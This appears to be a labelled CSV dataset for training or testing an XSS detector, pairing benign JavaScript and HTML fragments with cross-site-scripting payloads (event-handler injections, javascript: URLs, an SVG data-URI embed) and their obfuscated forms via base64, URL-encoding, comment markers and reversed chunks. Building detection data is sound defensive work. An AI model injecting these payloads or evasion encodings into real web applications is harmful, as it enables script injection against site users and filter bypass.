sample_id,label,payload_original,payload_obfuscated,generator,recipe
2192,0,"}, { key: ""_handleoverlayclick"", value: function _handleoverlayclick() {","}, { key: ""_handleoverlayclick"", value: function _handleoverlayclick() {",llm_style_t1.5,none
2193,1,<html id=x tabindex=1 onfocus=alert(1)></html>,PGh0bWwgaWQ9eCB0YWJpbmRleD0xIG9uZ/*OBF*/m9jd/*OBF*/XM9YWxlcnQoMSk%2BPC9odG1sPg%3D%3D,llm_style_t1.5,base64+html_entities+urlencode
2194,1,<details id=x tabindex=1 onfocusin=alert(1)></details>,%253Cdetails%2520id%253Dx%2520tabindex%253D1%2520onfocusin%253Dalert%25281%2529%253E%253C%252Fdetails%253E,llm_style_t1.5,urlencode+html_then_urlencode
2195,0,"data.push(this.renderrow(row, opts.isrtl, isweekselected))","data.push(this.renderrow(row, opts.isrtl, isweekselected))",llm_style_t1.5,none
2196,0,"const selector_dialog = '.modal-dialog' const selector_modal_body = '.modal-body' const selector_data_toggle = '[data-bs-toggle=""modal""]'","const selector_dialog = '.modal-dialog' const selector_modal_body = '.modal-body' const selector_data_toggle = '[data-bs-toggle=""modal""]'",llm_style_t1.5,none
2197,0,_handlemodalcloseclick(e) {,_handlemodalcloseclick(e) {,llm_style_t1.5,none
2198,1,<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,<main onfocusout=alert(    1) tabindex=1 id=  x><  /main><input autofocus>,llm_style_t1.5,whitespace_noise
2199,0,var $card = $(e.target).closest('.card'); if ($card.data('initialoverflow') === undefined) { $card.data(,var $card = $(e.target).closest('.card'); if ($card.data('initialoverflow') === undefined) { $card.data(,llm_style_t1.5,none
2200,0,"<ul><li><a href=""/w/index.php?title=grey_wolf_optimizer&amp;action=edit&amp;redlink=1"" class=""new"" title=""grey wolf optimizer (page does not exist)"">grey wolf optimizer </a> </li>","<ul><li><a href=""/w/index.php?title=grey_wolf_optimizer&amp;action=edit&amp;redlink=1"" class=""new"" title=""grey wolf optimizer (page does not exist)"">grey wolf optimizer </a> </li>",llm_style_t1.5,none
2201,1,"<img ondblclick=""alert(1)"">test</img>",%25253Cimg%252520ondblclick%25253D%252522alert%2525281%252529%252522%25253Etest%25253C%25252Fimg%25253E,llm_style_t1.5,double_urlencode+urlencode
2202,1,"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Cem%2520style%253D%2522animation-name%253Ax%2522%2520onanimationend%253D%2522alert%25281%2529%2522%253E%253C%252Fem%253E,llm_style_t1.5,double_urlencode
2203,1,"<script onmousedown=""alert(1)"">test</script>",%2526lt%253Bs/*OBF*/cript%2520onmousedown%253D%2526quot%253Balert%25281%2529%2526quot%253B%2526gt%253Btest%2526lt%253B%252F%2520script%2526gt%253B%2520,llm_style_t1.5,whitespace_noise+html_then_urlencode+urlencode
2204,0,if ($card.data('initialoverflow') === undefined) {,if ($card.data('initialoverflow') === undefined) {,llm_style_t1.5,none
2205,0,"} if ($(closestoverflowparent).css('position') === 'static') $(closestoverflowparent).css('position', 'relative');","} if ($(closestoverflowparent).css('position') === 'static') $(closestoverflowparent).css('position', 'relative');",llm_style_t1.5,none
2206,0,"this.el.addeventlistener('touchleave', this._handlerangeblurmouseouttouchleavebound)","this.el.addeventlistener('touchleave', this._handlerangeblurmouseouttouchleavebound)",llm_style_t1.5,none
2207,1,"<dialog oncontextmenu=""alert(1)"">test</dialog>",%253Cdialog%2520oncontextmenu%253D%2522alert%25281%2529%2522%253Etest%253C%252Fdialog%253E,llm_style_t1.5,double_urlencode
2208,0,"api.addfiles([ 'dist/js/materialize.js' ], 'client');","api.addfiles([ 'dist/js/materialize.js' ], 'client');",llm_style_t1.5,none
2209,1,"<rp onmouseup=""alert(1)"">test</rp>",PHJwIG9ubW91c2V1cD0iYWxlcnQoMSkiPnRlc3Q8L3JwPg==,llm_style_t1.5,base64+html_entities
2210,1,"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",PHEgb25iZWZvcmVjb3B5PSJhbGVydCgxKSIgY29udGVudGV/  *OBF*/kaXRhYmxlPnRlc3Q8L3E+,llm_style_t1.5,base64+comment_marker
2211,0,</span></a></dt><dd>see all available signals and how to work with them.</dd>,</span></a></dt><dd>see all available signals and how to work with them.</dd>,llm_style_t1.5,none
2212,0,if (opts.isinrange) { arr.push('is-inrange'); },if (opts.isinrange) { arr.push('is-inrange'); },llm_style_t1.5,none
2213,0,defaultprevented = jqueryevent.isdefaultprevented(),defaultprevented = jqueryevent.isdefaultprevented(),llm_style_t1.5,none
2214,1,"<datalist onmouseup=""alert(1)"">test</datalist>",PGRhdGFsaXN0IG9ubW91c2V1cD0iYWxlcnQoMSkiPnRlc3Q8L2RhdGFsaXN0Pg==,llm_style_t1.5,base64
2215,0,"}); window.index.add({ href: 'http://materializecss.com/dropdown.html',","}); window.index.add({ href: 'http://materializecss.com/dropdown.html',",llm_style_t1.5,none
2216,0,"var overflowoffsets = { top: clippingclientrect.top - elementclientrect.top + paddingobject.top, bottom: elementclientrect.bottom - clippingclientrect.bottom + paddingobject.bottom,","var overflowoffsets = { top: clippingclientrect.top - elementclientrect.top + paddingobject.top, bottom: elementclientrect.bottom - clippingclientrect.bottom + paddingobject.bottom,",llm_style_t1.5,none
2217,0,"scope_values.map(options.format.to),","scope_values.map(options.format.to),",llm_style_t1.5,none
2218,0,"var throttledresize = m.throttle(this._handlewindowscroll, 200)","var throttledresize = m.throttle(this._handlewindowscroll, 200)",llm_style_t1.5,none
2219,1,<rt id=x tabindex=1 onactivate=alert(1)></rt>,%3Crt%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C%2Frt%3E,llm_style_t1.5,comment_marker+urlencode+html_entities
2220,0,.removeclass('timepicker-dial-out'); this.resetclock(delay); cleartimeout(this.toggleviewtimer);,.removeclass('timepicker-dial-out'); this.resetclock(delay); cleartimeout(this.toggleviewtimer);,llm_style_t1.5,none
2221,1,"<th oncontextmenu=""alert(1)"">test</th>",%253Cth%2520oncontextmenu%253D%2522alert%25281%2529%2522%253Etest%253C%252Fth%253E,llm_style_t1.5,double_urlencode+comment_marker
2222,1,<slot onpointermove=alert(1)>xss</slot>,JTI2bHQlM0JzbCUyRiUyQU9CRiUyQSUyRm90JTIwb25wb2ludGVybW92ZSUzRGFsZXJ0JTI4MSUyOSUyNmd0JTNCeHNzJTI2bHQlM0IlMkZzbG90JTI2Z3QlM0I=,llm_style_t1.5,comment_marker+html_then_urlencode+base64
2223,1,"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",%26lt%3Bh1%20on/*OBF*/paste%3D%26quot%3Balert%281%29%26quot%3B%20contenteditab/*OBF*/le%26gt%3Btest%26lt%3B%2Fh1%26gt%3B,llm_style_t1.5,html_then_urlencode
2224,0,const data_key$5 = 'bs.focustrap',const data_key$5 = 'bs.focustrap',llm_style_t1.5,none
2225,1,"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationend=""alert(1)""></th>",%25253Cstyle%25253E%252540keyframes%252520x%25257B%25257D%25253C%25252Fstyle%25253E%25253Cth%252520style%25253D%252522animation-name%25253Ax%252522%252520onanimationend%25253D%252522alert%2525281%252529%252522%25253E%25253C%25252Fth%25253E,llm_style_t1.5,double_urlencode+urlencode
2226,1,"<del onmouseenter=""alert(1)"">test</del>","<del onmouseenter=""alert(1)"">  test< /del>",llm_style_t1.5,whitespace_noise
2227,1,"<figure draggable=""true"" ondragleave=""alert(1)"">test</figure>",%25253Cfigur/*OBF*/e%252520draggable%25253D%252522true%252522%252520ondragleave%25253D%252522alert%2525281%252529%252522%25253Etest%25253C%25252Ffigure%25253E,llm_style_t1.5,urlencode+double_urlencode
2228,0,return config; } static getinstance(element) {,return config; } static getinstance(element) {,llm_style_t1.5,none
2229,0,this.dropdown.recalculatedimensions(),this.dropdown.recalculatedimensions(),llm_style_t1.5,none
2230,0,if (args[i].hasownproperty(key)) {,if (args[i].hasownproperty(key)) {,llm_style_t1.5,none
2231,0,} nextwhenvisible() { if (!document.hidden && isvisible(this._element)) {,} nextwhenvisible() { if (!document.hidden && isvisible(this._element)) {,llm_style_t1.5,none
2232,1,"<option onbeforecopy=""alert(1)"" contenteditable>test</option>","< option onbeforecopy=""aler/*OBF*/t(1)"" con/*OBF*/tenteditable>test</option>",llm_style_t1.5,comment_marker
2233,0,this.$active = $(this.container).children('li').eq(this.activeindex),this.$active = $(this.container).children('li').eq(this.activeindex),llm_style_t1.5,none
2234,1,"<tr onmouseout=""alert(1)"">test</tr>",JTNDdHIlMjBvbm1vdXNlb3V0JTNEJTIyYWxlcnQlMjgxJTI5JTIyJTNFdGVzdCUzQyUyRnRyJTNF,llm_style_t1.5,urlencode+base64
2235,0,"} this._setinitialattributes(this._parent, this._getchildren()) eventhandler.on(this._element, event_keydown, event => this._keydown(event))","} this._setinitialattributes(this._parent, this._getchildren()) eventhandler.on(this._element, event_keydown, event => this._keydown(event))",llm_style_t1.5,none
2236,1,"<fieldset onmousedown=""alert(1)"">test</fieldset>",%25253Cfieldset%252520onmousedown%25253D%252522alert%2525281%252529%252522%25253Etest%25253C%25252Ffieldset%25253E,llm_style_t1.5,double_urlencode+urlencode
2237,0,"if (handler.oneoff) { eventhandler.off(element, event.type, selector, fn); }","if (handler.oneoff) { eventhandler.off(element, event.type, selector, fn); }",llm_style_t1.5,none
2238,0,"if (!isnan(year)) { this.calendars[0].year = parseint(year, 10); this.adjustcalendars();","if (!isnan(year)) { this.calendars[0].year = parseint(year, 10); this.adjustcalendars();",llm_style_t1.5,none
2239,0,"var popperaltoverflow = detectoverflow(state, { altboundary: true });","var popperaltoverflow = detectoverflow(state, { altboundary: true });",llm_style_t1.5,none
2240,1,"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",%253Cvideo%2520autoplay%2520controls%2520onseeking%253Dalert%25281%2529%253E%253Csource%2520src%253D%2522validvideo.mp4%2522%2520type%253D%2522video%252Fmp4%2522%253E%253C%252Fvideo%253E,llm_style_t1.5,double_urlencode
2241,1,"<frame onmousedown=""alert(1)"">test</frame>",Jmx0O2ZyYW1lIG9ubW91c2Vkb3duPSZxdW90O2FsZXJ0KDEpJnF1b3Q7Jmd0O3Rlc3QmbHQ7L2ZyYW1lJmd0Ow==,llm_style_t1.5,html_entities+base64
2242,0,"<li id=""cite_note-138""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-138"">^ </a> </b>","<li id=""cite_note-138""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-138"">^ </a> </b>",llm_style_t1.5,none
2243,0,"fn = _state$orderedmodifie.fn,","fn = _state$orderedmodifie.fn,",llm_style_t1.5,none
2244,1,"<footer draggable=""true"" ondragstart=""alert(1)"">test</footer>",%26lt%3Bfooter%20draggable%3D%26quot%3Btrue%26quot%3B%20ondragstart%3D%26quot%3Balert%281%29%26quot%3B%20%20%26gt%3Btest%26lt%3B%2Ff/*OBF*/ooter%26gt%3B,llm_style_t1.5,whitespace_noise+html_then_urlencode
2245,0,"return this._config.sanitize ? sanitizehtml(arg, this._config.allowlist, this._config.sanitizefn) : arg; } _resolvepossiblefunction(arg) {","return this._config.sanitize ? sanitizehtml(arg, this._config.allowlist, this._config.sanitizefn) : arg; } _resolvepossiblefunction(arg) {",llm_style_t1.5,none
2246,0,reference: 'toggle' } const defaulttype = {,reference: 'toggle' } const defaulttype = {,llm_style_t1.5,none
2247,1,"<img src=/ onerror=""alert(string.fromcharcode(88,83,83))""></img>",PGlt/*OBF*/ZyBzcmM9LyBvb/*OBF*/mVycm9yPSJ/ *OBF*/h/*OBF*/bGVydChzdHJpbmcuZnJvbWNoYXJjb2RlKDg4LDgzLDgzKSkiPjwv/*OBF*/aW1nPg==,llm_style_t1.5,base64+comment_marker
2248,0,if (placement === left || (placement === top || placement === bottom) && variation === end) {,if (placement === left || (placement === top || placement === bottom) && variation === end) {,llm_style_t1.5,none
2249,0,state.scrollparents = {,state.scrollparents = {,llm_style_t1.5,none
2250,0,var values = asarray(input),var values = asarray(input),llm_style_t1.5,none
2251,1,<small onpointerover=alert(1)>xss</small>,%253Csmall%2520onpointerover%253Dalert%25281%2529%253Exss/*OBF*/%253C%252Fsmall%253E,llm_style_t1.5,urlencode+html_then_urlencode
2252,0,"return selector ? selectorengine.findone(selector) : null }, getmultipleelementsfromselector(element) {","return selector ? selectorengine.findone(selector) : null }, getmultipleelementsfromselector(element) {",llm_style_t1.5,none
2253,1,"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cembed%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fembed%3E,llm_style_t1.5,urlencode
2254,0,"this.$overlay[0].addeventlistener('click', this._handleoverlayclickbound); this.el.addeventlistener('click', this._handlemodalcloseclickbound); }","this.$overlay[0].addeventlistener('click', this._handleoverlayclickbound); this.el.addeventlistener('click', this._handlemodalcloseclickbound); }",llm_style_t1.5,none
2255,0,"let throttledresize = m.throttle(this._handleresize, 200)","let throttledresize = m.throttle(this._handleresize, 200)",llm_style_t1.5,none
2256,0,trapelement.focus() } else if (this._lasttabnavdirection === tab_nav_backward) { elements[elements.length - 1].focus(),trapelement.focus() } else if (this._lasttabnavdirection === tab_nav_backward) { elements[elements.length - 1].focus(),llm_style_t1.5,none
2257,0,"var preventedoffset = within(tether ? min(min$1, tethermin) : min$1, offset, tether ? max(max$1, tethermax) : max$1)","var preventedoffset = within(tether ? min(min$1, tethermin) : min$1, offset, tether ? max(max$1, tethermax) : max$1)",llm_style_t1.5,none
2258,0,"opacity: 1, scale: [0.4, 1], translatey: [this.offsety, 0],","opacity: 1, scale: [0.4, 1], translatey: [this.offsety, 0],",llm_style_t1.5,none
2259,0,"'sass/components/_timepicker.scss', 'sass/components/_toast.scss', 'sass/components/_tooltip.scss',","'sass/components/_timepicker.scss', 'sass/components/_toast.scss', 'sass/components/_tooltip.scss',",llm_style_t1.5,none
2260,0,"<ul><li><a href=""#citerefdreyfus1972"">dreyfus 1972 </a>, <a href=""#citerefdreyfusdreyfus1986"">dreyfus &amp; dreyfus 1986 </a> </li>","<ul><li><a href=""#citerefdreyfus1972"">dreyfus 1972 </a>, <a href=""#citerefdreyfusdreyfus1986"">dreyfus &amp; dreyfus 1986 </a> </li>",llm_style_t1.5,none
2261,0,return false; } var relativex = ripple.getattribute('data-x');,return false; } var relativex = ripple.getattribute('data-x');,llm_style_t1.5,none
2262,1,<script>onpageswap=settimeout;location='x';event.prototype.tostring=evalerror.prototype.tostring;event.prototype.name='alert\x281\x29'</script>,PHNjcmlwdD5vbnBhZ2Vzd2FwPXNldHRpbWVvdXQ7bG9jYXRpb249J3gnO2V2ZW50LnByb3RvdHlwZS50b3N0cmluZz1ldmFsZXJyb3IucHJvdG90eXBlLnRvc3RyaW5nO2V2ZW50LnByb3RvdHlwZS5uYW1lPSdhbGVydFx4MjgxXHgyOSc8L3NjcmlwdD4=  ,llm_style_t1.5,base64
2263,0,if (!this.ismultiple) { collection.find('li.selected').removeclass('selected'); },if (!this.ismultiple) { collection.find('li.selected').removeclass('selected'); },llm_style_t1.5,none
2264,0,"var element = getwaveseffectelement(e); if (element !== null) { effect.show(e, element);","var element = getwaveseffectelement(e); if (element !== null) { effect.show(e, element);",llm_style_t1.5,none
2265,1,<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,&lt;script id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/script&gt;&lt;input autofocus&gt;,llm_style_t1.5,html_entities
2266,0,let ins = classdef.getinstance(el),let ins = classdef.getinstance(el),llm_style_t1.5,none
2267,0,$('.collapsible').collapsible(); $('.collapsible.expandable').collapsible({ accordion: false,$('.collapsible').collapsible(); $('.collapsible.expandable').collapsible({ accordion: false,llm_style_t1.5,none
2268,0,"throw new error(""nouislider: 'padding' option must be less than half the range."")","throw new error(""nouislider: 'padding' option must be less than half the range."")",llm_style_t1.5,none
2269,0,"eventhandler.on(document, event_click_data_api, selector_data_toggle, event => { event.preventdefault(); const button = event.target.closest(selector_data_toggle);","eventhandler.on(document, event_click_data_api, selector_data_toggle, event => { event.preventdefault(); const button = event.target.closest(selector_data_toggle);",llm_style_t1.5,none
2270,0,scrollspy._count--; this._removeeventhandlers(); $(this.options.getactiveelement(this.$el.attr('id'))).removeclass(this.options.activeclass);,scrollspy._count--; this._removeeventhandlers(); $(this.options.getactiveelement(this.$el.attr('id'))).removeclass(this.options.activeclass);,llm_style_t1.5,none
2271,1,"<dialog draggable=""true"" ondrag=""alert(1)"">test</dialog>","<dialog draggable=""true"" ondrag=""alert( 1)"">test<  /dialog>",llm_style_t1.5,whitespace_noise
2272,0,value: function _setupfixed() {,value: function _setupfixed() {,llm_style_t1.5,none
2273,0,"<li><a href=""#citerefpoolemackworthgoebel1998"">poole, mackworth &amp; goebel 1998 </a>, pp.&#160;345–395, </li>","<li><a href=""#citerefpoolemackworthgoebel1998"">poole, mackworth &amp; goebel 1998 </a>, pp.&#160;345–395, </li>",llm_style_t1.5,none
2274,1,"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>",%26amp%3Blt%3Bsvg%20draggable%3D%26amp%3Bquot%3Btrue%26amp%3Bquot%3B%20ondragstart%3D%26amp%3Bquot%3Balert%281%29%26amp%3Bquot%3B%26amp%3Bgt%3Btest%26amp%3Blt%3B%2Fsvg%26amp%3Bgt%3B,llm_style_t1.5,html_entities+html_then_urlencode
2275,0,"title: 'grid', body: 'we are using a standard 12 column fluid responsive grid system. the grid helps you layout your page in an ordered, easy fashion.' });","title: 'grid', body: 'we are using a standard 12 column fluid responsive grid system. the grid helps you layout your page in an ordered, easy fashion.' });",llm_style_t1.5,none
2276,0,"delay: this.options.duration,","delay: this.options.duration,",llm_style_t1.5,none
2277,0,this.ismultiple = this.$el.prop('multiple'),this.ismultiple = this.$el.prop('multiple'),llm_style_t1.5,none
2278,0,"}, { key: ""_dragmoveupdate"", value: function _dragmoveupdate(e) {","}, { key: ""_dragmoveupdate"", value: function _dragmoveupdate(e) {",llm_style_t1.5,none
2279,1,<image2 onpointerenter=alert(1)>xss</image2>,%3Cimage2%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fimage2%3E,llm_style_t1.5,urlencode
2280,0,if (value !== null) {,if (value !== null) {,llm_style_t1.5,none
2281,0,} pageoffset = pageoffset || getpageoffset(); if ( mouse || pointer ) {,} pageoffset = pageoffset || getpageoffset(); if ( mouse || pointer ) {,llm_style_t1.5,none
2282,1,<figure onpointerover=alert(1)>xss</figure>,<figure onpointerove/*OBF*/r=alert(1)>  xss</figur/  * OBF*/e>,llm_style_t1.5,comment_marker+whitespace_noise
2283,0,"<li id=""cite_note-fuzzy_logic-201""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-fuzzy_logic_201-0"">^ </a> </b>","<li id=""cite_note-fuzzy_logic-201""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-fuzzy_logic_201-0"">^ </a> </b>",llm_style_t1.5,none
2284,1,<dl onpointerup=alert(1)>xss</dl>,PGRsIG9ucG9pbnRlcnVwPWFsZXJ0KDEpPnhzczwvZGw+,llm_style_t1.5,base64+whitespace_noise
2285,0,"} getnextactiveelement(items, target, key === arrow_down_key, !items.includes(target)).focus() }","} getnextactiveelement(items, target, key === arrow_down_key, !items.includes(target)).focus() }",llm_style_t1.5,none
2286,1,<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,llm_style_t1.5,comment_marker
2287,0,"this._observablesections.set(anchor.hash, observablesection) } }","this._observablesections.set(anchor.hash, observablesection) } }",llm_style_t1.5,none
2288,1,<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>,%3Cdl%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C%2Fdl%3E%3Cinput%20id%3Dy%20autofocus%3E,llm_style_t1.5,urlencode+html_entities
2289,0,this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,llm_style_t1.5,none
2290,1,<b onpointerleave=alert(1)>xss</b>,%25253Cb%252520onpointerleave%25253Dalert%2525281%252529%25253Exss%25253C%25252Fb%25253E,llm_style_t1.5,double_urlencode+urlencode+comment_marker
2291,1,"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",%3Eintextt%3C%2Fpla%29%22%3Eteslert%281art%3D%22adragstue%22%20onle%3D%22trraggabtext%20d%3Cplain,llm_style_t1.5,reverse_chunks+urlencode
2292,1,"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",PHVsIGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnZW50ZXI9ImFsZXJ0KDEpIj50ZXN0PC91bD4=,llm_style_t1.5,base64
2293,0,} _isanimated() { return this._element.classlist.contains(class_name_slide);,} _isanimated() { return this._element.classlist.contains(class_name_slide);,llm_style_t1.5,none
2294,1,"<spacer onmouseleave=""alert(1)"">test</spacer>",&gt;acer&lt;/sptest1)&quot;&gt;ert(=  &quot;aleaveuselonmocer &lt;spa,llm_style_t1.5,reverse_chunks+html_entities
2295,0,relativex = e.touches[0].pagex - pos.left,relativex = e.touches[0].pagex - pos.left,llm_style_t1.5,none
2296,0,var $collapsiblelis = this.$el.children('li'),var $collapsiblelis = this.$el.children('li'),llm_style_t1.5,none
2297,0,"prev(element, selector) { let previous = element.previouselementsibling; while (previous) {","prev(element, selector) { let previous = element.previouselementsibling; while (previous) {",llm_style_t1.5,none
2298,0,$closesttrigger[0].m_dropdown.isopen ) { leavetoactivedropdowntrigger = true;,$closesttrigger[0].m_dropdown.isopen ) { leavetoactivedropdowntrigger = true;,llm_style_t1.5,none
2299,0,"const link = document.queryselector(`.bd-aside a[href=""${hash}""]`) if (!link) { return","const link = document.queryselector(`.bd-aside a[href=""${hash}""]`) if (!link) { return",llm_style_t1.5,none
2300,0,this._slide(order_next); } nextwhenvisible() {,this._slide(order_next); } nextwhenvisible() {,llm_style_t1.5,none
2301,0,} var clientrect = element.getboundingclientrect(); var scalex = 1;,} var clientrect = element.getboundingclientrect(); var scalex = 1;,llm_style_t1.5,none
2302,0,"group = unique(group.slice().sort(function(a, b){ return a - b","group = unique(group.slice().sort(function(a, b){ return a - b",llm_style_t1.5,none
2303,1,"<link draggable=""true"" ondragend=""alert(1)"">test</link>",PGxpbmsgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbmQ9ImFsZXJ0KDEpIj50ZXN0PC9saW5rPg==,llm_style_t1.5,base64
2304,0,switch (type.tolowercase()) {,switch (type.tolowercase()) {,llm_style_t1.5,none
2305,1,"<dir onmouseout=""alert(1)"">test</dir>",PGRpciBvbm1vdXNlb3V0PSJhbGVydCgxKSI+  dGVzdDwvZGlyPg= =,llm_style_t1.5,base64
2306,0,"this.data(key, name[key]); } return this;","this.data(key, name[key]); } return this;",llm_style_t1.5,none
2307,1,"<title onmouseup=""alert(1)"">test</title>",%26lt%3Btitle%20onmouseup%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Ftitle%26gt%3B,llm_style_t1.5,html_then_urlencode+whitespace_noise
2308,1,<data onpointerup=alert(1)>xss</data>,%26lt%3Bdata%20onpointerup%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fdata%26gt%3B,llm_style_t1.5,html_then_urlencode
2309,1,"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>","<  embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==""   type=""image/ svg+xml"" allowscriptaccess=""always""></embed>",llm_style_t1.5,whitespace_noise
2310,0,this.el.m_tooltip = this,this.el.m_tooltip = this,llm_style_t1.5,none
2311,1,"<form onformdata=""alert(1)""><button>click</button></form>",%3Cform%20onformdata%3D%22alert%281%29%22%3E%3Cbutton%3Eclick%3C%2Fbutton%3E%3C%2Fform%3E,llm_style_t1.5,urlencode+whitespace_noise
2312,0,"'notify:sass_compile' ]); grunt.registertask('server', ['browsersync', 'notify:server']);","'notify:sass_compile' ]); grunt.registertask('server', ['browsersync', 'notify:server']);",llm_style_t1.5,none
2313,0,"this._setattributeifnotexists(outerelem, 'role', 'presentation')","this._setattributeifnotexists(outerelem, 'role', 'presentation')",llm_style_t1.5,none
2314,1,"<strong onmouseup=""alert(1)"">test</strong>","<strong onmouseup=  ""alert(1)"">  test</ strong> ",llm_style_t1.5,whitespace_noise+comment_marker
2315,0,document.documentelement.nouilisteners.foreach(function( c ) {,document.documentelement.nouilisteners.foreach(function( c ) {,llm_style_t1.5,none
2316,0,const class_name_fade$1 = 'fade'; const class_name_show$1 = 'show'; const class_dropdown = 'dropdown';,const class_name_fade$1 = 'fade'; const class_name_show$1 = 'show'; const class_dropdown = 'dropdown';,llm_style_t1.5,none
2317,1,<form><button formaction=javascript:alert(1)>xss,%26lt%3Bform%26gt%3B%26lt%3Bbutton%20formaction%3Djavascript%3Aalert%281%29%26gt%3Bxss,llm_style_t1.5,html_then_urlencode
2318,0,"}; var parallax = function (_component5) { _inherits(parallax, _component5);","}; var parallax = function (_component5) { _inherits(parallax, _component5);",llm_style_t1.5,none
2319,1,"<base onmousedown=""alert(1)"">test</base>",JTNDYmFzZSUyMG9ubW91c2Vkb3duJTNEJTIyYWxlcnQlMjgxJTI5JTIyJTNFdGVzdCUzQyUyRmJhc2UlM0U=,llm_style_t1.5,urlencode+base64
2320,0,const selector_nav_links = '.nav-link' const selector_nav_items = '.nav-item' const selector_list_items = '.list-group-item',const selector_nav_links = '.nav-link' const selector_nav_items = '.nav-item' const selector_list_items = '.list-group-item',llm_style_t1.5,none
2321,0,var dochandlekeyup = function (e) { m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) {,var dochandlekeyup = function (e) { m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) {,llm_style_t1.5,none
2322,1,<source onpointerup=alert(1)>xss</source>,<source onpointerup=alert( 1)  >xss</source> ,llm_style_t1.5,comment_marker+whitespace_noise
2323,0,} this._settabsandtabwidth(); this._animateindicator(previndex);,} this._settabsandtabwidth(); this._animateindicator(previndex);,llm_style_t1.5,none
